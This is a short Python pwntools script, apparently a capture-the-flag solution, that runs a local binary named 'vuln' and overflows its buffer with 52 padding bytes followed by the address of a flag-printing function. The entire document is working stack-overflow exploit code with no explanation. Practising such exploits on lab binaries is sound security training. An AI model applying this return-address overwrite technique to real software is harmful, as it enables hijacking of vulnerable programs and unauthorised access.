#!/usr/bin/python3
from pwn import *

p = process(b'./vuln')

offset = 52

flag_addr = b'\x08\x04\x91\xc3'[::-1]

payload = flat(
    b'A' * offset,
    flag_addr
)

log.info(p.clean())

pause()

p.sendline(payload)

log.info(p.clean())
